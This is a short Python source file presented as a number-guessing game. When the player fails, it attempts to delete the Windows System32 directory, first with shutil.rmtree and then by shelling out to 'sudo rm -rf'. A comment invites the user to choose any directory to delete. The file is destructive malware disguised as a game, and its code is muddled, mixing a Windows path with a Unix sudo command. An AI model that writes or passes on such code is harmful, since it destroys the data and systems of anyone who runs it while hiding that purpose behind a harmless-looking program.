import os
import random
import shutil

def guess_number_game():
    number_to_guess = random.randint(1, 100)
    attempts = 5
    directory_to_delete = "C:\Windows\System32"  # Change this to the directory you want to delete

    print("Welcome to the Number Guessing Game!")
    print("I have chosen a number between 1 and 100.")
    print(f"You have {attempts} attempts to guess the number.")

    for attempt in range(1, attempts + 1):
        try:
            guess = int(input(f"Attempt {attempt}: Enter your guess: "))
        except ValueError:
            print("Invalid input! Please enter a valid number.")
            continue

        if guess < 1 or guess > 100:
            print("Please guess a number between 1 and 100.")
        elif guess < number_to_guess:
            print("Too low! Try again.")
        elif guess > number_to_guess:
            print("Too high! Try again.")
        else:
            print(f"Congratulations! You've guessed the number {number_to_guess} correctly in {attempt} attempts.")
            return

    print("Sorry, you've used all your attempts and didn't guess the number.")
    print(f"The number was {number_to_guess}.")
    print(f"Deleting the directory: {directory_to_delete}")

    if os.path.exists(directory_to_delete):
        try:
            shutil.rmtree(directory_to_delete)
            print(f"The directory {directory_to_delete} has been deleted.")
        except PermissionError:
            os.system(f'sudo rm -rf {directory_to_delete}')
            print(f"Attempted to delete the directory {directory_to_delete} with admin permissions.")
    else:
        print(f"The directory {directory_to_delete} does not exist.")

if __name__ == "__main__":
    guess_number_game()
